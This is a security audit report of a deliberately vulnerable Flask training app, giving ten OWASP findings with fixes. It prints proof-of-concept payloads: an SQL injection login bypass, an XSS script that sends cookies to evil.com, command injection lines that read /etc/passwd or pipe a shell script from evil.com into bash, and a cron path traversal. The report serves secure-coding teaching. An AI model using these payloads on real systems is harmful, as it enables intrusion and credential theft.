This report documents a manual security code review of a Python Flask web application. The target application was deliberately constructed with ten representative vulnerabilities spanning the OWASP Top 10 to serve as an educational audit exercise. Each finding includes the vulnerable code, a proof-of-concept attack vector, and the fully remediated secure version with step-by-step remediation guidance.

The audit covered the complete source of vulnerable_app.py — a single-file Flask application implementing user authentication, a post board, file upload, a search API, and a diagnostic ping utility backed by SQLite.

V-01 Critical SQL Injection — Login & Search CWE-89 · A03:2021 ▼
OWASP Category
A03:2021 — Injection
Affected Files
vulnerable_app.py:61, :87
Impact
Authentication bypass, full database exfiltration
Effort to Exploit
Very Low — no special tools required
User-supplied input is concatenated directly into SQL strings using Python f-strings. An attacker can inject SQL syntax to bypass authentication entirely (logging in as any user without a password) or dump the entire database via UNION-based or error-based injection. Both the login and search endpoints are affected.
⚡ Proof-of-Concept Attack:
Login username: ' OR '1'='1' -- (any password)
Resulting query: SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='...'
Result: Logs in as the first user in the database (admin).
✗ Vulnerable Code
# Direct f-string interpolation
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
result = conn.execute(query).fetchone()

# Second injection point in /search
query = f"SELECT id, username, email FROM users WHERE username LIKE '%{term}%'"
✓ Secure Code
# Parameterized query — ? placeholders
user = db.execute(
    "SELECT * FROM users WHERE username = ?",
    (username,)
).fetchone()

# Search with safe LIKE parameter
users = db.execute(
    "SELECT id, username FROM users WHERE username LIKE ?",
    (f"%{term}%",)
).fetchall()

Remediation Steps

  1. Replace all f-string SQL with parameterized queries — use ? placeholders and pass values as a tuple.
  2. Never concatenate user input into SQL — treat all external data as untrusted regardless of source.
  3. Use an ORM (SQLAlchemy, Django ORM) for all database access to make parameterization the default path.
  4. Apply least-privilege — the database user should have only SELECT/INSERT on necessary tables, not DROP/ALTER.
  5. Run Bandit with the B608 rule to catch SQL injection patterns automatically in CI.
V-02 Critical Stored Cross-Site Scripting (XSS) CWE-79 · A03:2021 ▼
OWASP Category
A03:2021 — Injection
Affected Files
vulnerable_app.py:98–102, POST_HTML template
Impact
Session hijacking, credential theft, malware distribution
Effort to Exploit
Very Low — any logged-in user can exploit
User-supplied post content is stored in the database without sanitization and rendered into the page using Jinja2's | safe filter, which explicitly disables HTML escaping. Any script tag stored in the database executes in every visitor's browser. An attacker can steal session cookies, redirect users to phishing pages, or mine cryptocurrency.
⚡ Proof-of-Concept Payload:
Post content: <script>fetch('https://evil.com/?c='+document.cookie)</script>
Result: Every user who views the posts page has their session cookie exfiltrated.
✗ Vulnerable Code
# Raw HTML string building
posts_html = "".join(f"<div>{p[0]}</div>" for p in posts)

# Template renders with | safe — NO escaping
{{ posts | safe }}
✓ Secure Code
# Pass list of strings, NOT pre-built HTML
posts = [p["content"] for p in rows]

# Jinja2 auto-escapes {{ p }} — NO | safe
{% for p in posts %}
  <div>{{ p | e }}</div>
{% endfor %}

# Plus: Content Security Policy header
"Content-Security-Policy": "script-src 'self';"

Remediation Steps

  1. Never use | safe on user-controlled content. Jinja2 auto-escapes by default — work with that, not against it.
  2. Implement a Content Security Policy header with script-src 'self' as a defence-in-depth measure.
  3. Set HttpOnly on session cookies so JavaScript cannot read them even if XSS occurs.
  4. Validate input length on both client and server to limit payload size.
V-03 High Hardcoded Credentials & Secret Key CWE-798 · A02:2021 ▼
OWASP Category
A02:2021 — Cryptographic Failures
Affected Files
vulnerable_app.py:31
Impact
Session forgery, full application takeover
Effort to Exploit
Low — key exposed in source control
The Flask secret key is hardcoded as "password123". Anyone with access to the source code (including any contributor, git history viewer, or code leak) can forge signed session cookies, impersonate any user, and elevate privileges.
✗ Vulnerable Code
app.secret_key = "password123"
# Exposed in git history forever
✓ Secure Code
import os, secrets
app.secret_key = os.environ.get("FLASK_SECRET_KEY") \
    or secrets.token_hex(32)
# Store in .env / vault, never in code

Remediation Steps

  1. Move all secrets to environment variables — use python-dotenv for local dev, a secrets manager (AWS Secrets Manager, HashiCorp Vault) in production.
  2. Add .env to .gitignore and rotate any key that has ever been committed to git.
  3. Use secrets.token_hex(32) to generate a cryptographically strong key.
  4. Run Semgrep or git-secrets in CI to block secret commits before they reach the repository.
V-04 High Insecure Direct Object Reference (IDOR) CWE-639 · A01:2021 ▼
OWASP Category
A01:2021 — Broken Access Control
Affected Files
vulnerable_app.py:111–124
Impact
Any user can view any other user's full profile including plaintext password
Effort to Exploit
Very Low — increment URL integer
The /user/<id> endpoint returns another user's full record — including their plaintext password — to any authenticated user. There is no ownership check: a logged-in user simply changes the URL integer to access any account.
⚡ Attack: Logged in as user ID 3 (bob), visit /user/1 → receives admin's email and plaintext password.
✗ Vulnerable Code
@app.route("/user/<int:user_id>")
def view_user(user_id):
    # No ownership check!
    user = conn.execute(
        f"SELECT id,username,email,password FROM users WHERE id={user_id}"
    ).fetchone()
    return jsonify({"password": user[3]})
✓ Secure Code
@app.route("/user/<int:user_id>")
@login_required
def view_user(user_id):
    # S-04: Ownership check
    if session["user_id"] != user_id \
       and session.get("role") != "admin":
        abort(403)
    # Never return password_hash
    return jsonify({"id": ..., "username": ..., "email": ...})

Remediation Steps

  1. Enforce server-side authorization on every resource — verify the session user owns the requested record before returning it.
  2. Return 403 Forbidden (not 404) when a user is authenticated but unauthorized.
  3. Never return password hashes or internal fields in API responses — use a serialization allowlist.
  4. Prefer UUIDs over sequential IDs in URLs to make enumeration harder (security-through-obscurity only; not a substitute for access control).
V-05 High Broken Authentication — No Rate-Limiting or Lockout CWE-307 · A07:2021 ▼
OWASP Category
A07:2021 — Identification & Auth Failures
Affected Files
vulnerable_app.py:53–70
Impact
Credential stuffing / brute-force against any account
Effort to Exploit
Low — any automated tool
The login endpoint accepts unlimited requests with no rate-limiting, CAPTCHA, or account lockout. An attacker can automate credential stuffing (using leaked username/password lists) or brute-force any account at thousands of attempts per second. Combined with plaintext passwords (V-06), a single successful attempt yields the cleartext credential.
✗ Vulnerable Code
@app.route("/login", methods=["POST"])
def login():
    # No rate limit, no lockout, no CAPTCHA
    username = request.form.get("username")
    password = request.form.get("password")
    # Direct compare — brute-forceable
✓ Secure Code
# flask-limiter: max 10 attempts/min per IP
@limiter.limit("10/minute")
@app.route("/login", methods=["POST"])
def login():
    # Lockout after 5 failures for 15 min
    if user["failed_logins"] >= MAX_FAILED:
        return "Account locked", 429

Remediation Steps

  1. Add IP-based rate-limiting with flask-limiter — limit login to 5–10 attempts per minute per IP.
  2. Implement account lockout — lock after 5 consecutive failures for 15 minutes; reset on successful login.
  3. Return the same generic error for "wrong username" and "wrong password" to prevent user enumeration.
  4. Log all failed attempts and alert on unusual patterns (100+ failures = active attack).
  5. Require MFA for privileged accounts using TOTP (pyotp).
V-06 High Sensitive Data Exposure — Plaintext Passwords CWE-256 · A02:2021 ▼
OWASP Category
A02:2021 — Cryptographic Failures
Affected Files
vulnerable_app.py:40–44, :120
Impact
Instant credential compromise on any DB access or leak
Effort to Exploit
None — passwords readable without any cracking
Passwords are stored and compared as plaintext strings in the database. They are also returned directly in API responses. A single SQL injection, database backup leak, or compromised admin account exposes every user's password — and because people reuse passwords, this extends to their email, banking, and other accounts.
✗ Vulnerable Code
# Stored as plaintext
INSERT INTO users VALUES (1,'admin','admin123',...)

# Compared as plaintext
WHERE username='{username}' AND password='{password}'

# Returned in API response
"password": user[3]
✓ Secure Code
from argon2 import PasswordHasher PH = PasswordHasher() # Store Argon2 hash PH.hash(password) # → "$argon2id$..." # Constant-time verify PH.verify(user["password_hash"], provided) # Never return hash in response return jsonify({"id":..., "username":...})

Remediation Steps

  1. Use Argon2id (via argon2-cffi) — the current OWASP-recommended algorithm. Fallback: bcrypt or PBKDF2-SHA256 with 260,000+ iterations.
  2. Never store or log plaintext passwords — hash on the way in, verify on the way in, never retrieve.
  3. Use constant-time comparison (hmac.compare_digest) when comparing any secret to prevent timing attacks.
  4. Force a password reset for all users if plaintext passwords were ever stored.
V-07 Critical OS Command Injection CWE-78 · A03:2021 ▼
OWASP Category
A03:2021 — Injection
Affected Files
vulnerable_app.py:129–131
Impact
Remote code execution, full server compromise
Effort to Exploit
Very Low — single HTTP request
The /ping route passes unsanitized user input directly to subprocess with shell=True. This gives an attacker full shell access to the server — they can read files, install backdoors, pivot laterally, or exfiltrate data.
⚡ Proof-of-Concept:
GET /ping?host=localhost;cat /etc/passwd
GET /ping?host=localhost;curl evil.com/shell.sh|bash
✗ Vulnerable Code
host = request.args.get("host")
# shell=True + user input = RCE
result = subprocess.check_output(
    f"ping -c 1 {host}",
    shell=True
)
✓ Secure Code
# Strict hostname validation regex VALID = re.compile(r"^[a-zA-Z0-9.\-]{1,253}$") if not VALID.match(host): abort(400) # List form + shell=False (default) subprocess.check_output( ["ping", "-c", "1", host], timeout=5 )

Remediation Steps

  1. Never use shell=True with user input — always pass commands as a list to prevent shell metacharacter interpretation.
  2. Validate input with a strict allowlist regex before passing it to any system call.
  3. Prefer Python library alternatives — use socket.getaddrinfo() or icmplib instead of spawning a shell.
  4. Run the application with minimal OS privileges — a low-privilege user can't install backdoors even if RCE is achieved.
V-08 Medium Insecure File Upload CWE-434 · A04:2021 ▼
OWASP Category
A04:2021 — Insecure Design
Affected Files
vulnerable_app.py:137–148
Impact
Malware upload, path traversal, server storage exhaustion
Effort to Exploit
Low
Files are saved using the client-supplied filename with no type checking, size limit, or name sanitization. An attacker can upload a web shell (e.g., shell.php), use path traversal (../../../etc/cron.d/evil) to write to arbitrary locations, or upload a large file to exhaust disk space.
✗ Vulnerable Code
f = request.files.get("file") # No type check, no size limit path = os.path.join(UPLOAD_DIR, f.filename) f.save(path)
✓ Secure Code
ALLOWED = {".jpg",".png",".pdf",".txt"} _, ext = os.path.splitext(f.filename) if ext.lower() not in ALLOWED: abort(400) # Random UUID filename — no traversal safe = f"{uuid.uuid4().hex}{ext}" f.save(os.path.join(UPLOAD_DIR, safe)) # Flask config cap: 5 MB MAX_CONTENT_LENGTH = 5 * 1024 * 1024

Remediation Steps

  1. Validate by extension AND MIME type — check both python-magic content sniffing and the file extension against an allowlist.
  2. Randomize filenames with UUID — never trust the client-supplied name.
  3. Set MAX_CONTENT_LENGTH in Flask config to cap upload sizes.
  4. Store uploads outside the web root and serve them through a controller that sets appropriate Content-Type and Content-Disposition headers.
  5. Scan uploads with antivirus (ClamAV) before making them accessible.
V-09 Medium Missing HTTP Security Headers CWE-693 · A05:2021 ▼
OWASP Category
A05:2021 — Security Misconfiguration
Affected Files
vulnerable_app.py — all responses
Impact
Enables clickjacking, MIME sniffing, XSS amplification
Effort to Exploit
Low — passive defence gap
None of the standard browser security headers are set. Without them, browsers apply permissive defaults: the page can be framed (clickjacking), MIME types can be sniffed (allows content injection), and there's no browser-side XSS filter layer.
✗ Vulnerable Code
# No security headers configured. # Flask returns only: # Content-Type: text/html # No CSP, no X-Frame-Options, etc.
✓ Secure Code
@app.after_request def security_headers(resp): resp.headers["X-Content-Type-Options"] = "nosniff" resp.headers["X-Frame-Options"] = "DENY" resp.headers["Referrer-Policy"] = "strict-origin" resp.headers["Content-Security-Policy"] = "default-src 'self';" resp.headers["Strict-Transport-Security"] = "max-age=31536000" return resp

Remediation Steps

  1. Add an @app.after_request hook that sets all security headers on every response.
  2. Use flask-talisman for a one-line security header solution with sensible defaults.
  3. Verify headers with securityheaders.com after deployment.
  4. Tune CSP incrementally — start with Report-Only mode to identify violations before enforcing.
V-10 Medium Debug Mode Enabled in Production CWE-94 · A05:2021 ▼
OWASP Category
A05:2021 — Security Misconfiguration
Affected Files
vulnerable_app.py:33, :173
Impact
Interactive debugger exposes Python REPL to any visitor
Effort to Exploit
Low — triggered by any unhandled exception
Flask's debug=True activates the Werkzeug interactive debugger. On any unhandled exception, any visitor sees a full stack trace and can execute arbitrary Python code via the browser-based REPL — an immediate RCE vector. The app also binds on 0.0.0.0, exposing it to all network interfaces.
✗ Vulnerable Code
app.debug = True app.run(host="0.0.0.0", port=5000, debug=True)
✓ Secure Code
app.debug = False # Use production WSGI server # gunicorn -w 4 -b 127.0.0.1:8000 app:app # Never expose Flask dev server publicly

Remediation Steps

  1. Set debug=False unconditionally in production; control via FLASK_ENV=production.
  2. Use a production WSGI server — Gunicorn, uWSGI, or Waitress. Never run the Flask dev server in production.
  3. Bind to 127.0.0.1 and use a reverse proxy (nginx) for external traffic.
  4. Implement custom error pages that log internally but show users only a generic error message.
Recommendations

Secure Coding Best Practices

Beyond the specific fixes, these foundational practices should be embedded into the development workflow.

Input Validation
  • → Validate type, length, and format of all inputs
  • → Use allowlists (accepted values) not denylists
  • → Reject and log malformed input — don't try to clean it
  • → Validate on the server — client-side only is cosmetic
Authentication
  • → Argon2id > bcrypt > PBKDF2 for password hashing
  • → Enforce MFA on all privileged accounts
  • → Implement PKCE-based OAuth2 for third-party auth
  • → Short-lived session tokens with absolute expiry
Dependency Management
  • → Pin dependencies with pip-compile
  • → Run pip-audit in CI to catch known CVEs
  • → Enable Dependabot / Renovate for automated PRs
  • → Keep a minimal dependency surface
CI/CD Security Gates
  • → Block merges on Bandit HIGH/CRITICAL findings
  • → Run Semgrep with OWASP ruleset on every PR
  • → Secret scanning with Trufflehog or GitHub secret scanning
  • → DAST (ZAP/Burp) in staging pipeline
